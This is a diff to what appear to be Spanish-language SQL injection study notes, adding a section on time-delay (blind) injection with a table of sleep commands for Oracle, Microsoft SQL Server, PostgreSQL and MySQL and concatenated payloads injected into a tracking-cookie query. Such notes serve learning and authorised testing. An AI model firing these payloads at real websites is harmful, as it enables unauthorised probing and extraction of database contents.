@@ -374,6 +374,35 @@ AND 1=2
 **NOTA: Es posible que la consulta se encuentre truncada por lo que puedes eliminar el valor de la cookie o hacer consultas más genericas**
 **NOTA:La intención de CAST es que la salida del error muestra la información sensible que es objetivo**
 
+## Time Delays
+Cuando las técnicas anteriroes fallaron y no generaron algún tipo de comporatmiento, se puede recurrir a los retrasos de tiempo, pero se deben tener en cuenta las siguientes consideraciones
+- Se recomienda concatenar, ya que jecutar multiples consultas con ";" puede estar deshabilitado
+- Se recomienda comentar los siguientes parametros "payload--"
+- Tener en cuenta si esta truncado
+- Los milisegundos se encuentra en la esquina inferior derecha de burp en el response
+### Tabla general de comandos
+| Base de Datos | Comando para Espera de 10 Segundos                       |
+|---------------|----------------------------------------------------------|
+| Oracle        | `dbms_pipe.receive_message(('a'),10)`                    |
+| Microsoft     | `WAITFOR DELAY '0:0:10'`                                 |
+| PostgreSQL    | `SELECT pg_sleep(10)`                                    |
+| MySQL         | `SELECT SLEEP(10)`                                       |
+### Ejemplo de concatenación de retrasos de tiempo
+```
+Consulta base:
+SELECT * FROM tracking WHERE id = 'fGR4W3zRJt6aOnhx'
+
+Ejemplo PostgreSQL
+'|| (SELECT pg_sleep(10))--
+SELECT * FROM tracking WHERE id = 'fGR4W3zRJt6aOnhx'|| (SELECT pg_sleep(10))--'
+
+Ejemplo Oracle
+dbms_pipe.receive_message(('a'),10)
+SELECT * FROM tracking WHERE id = 'fGR4W3zRJt6aOnhx'|| (select dbms_pipe.receive_message(('a'),10) from dual;)--'
+
+'; IF (1=2) WAITFOR DELAY '0:0:10'--
+```
+
 # Final
 Cheat Sheet
 https://portswigger.net/web-security/sql-injection/cheat-sheet
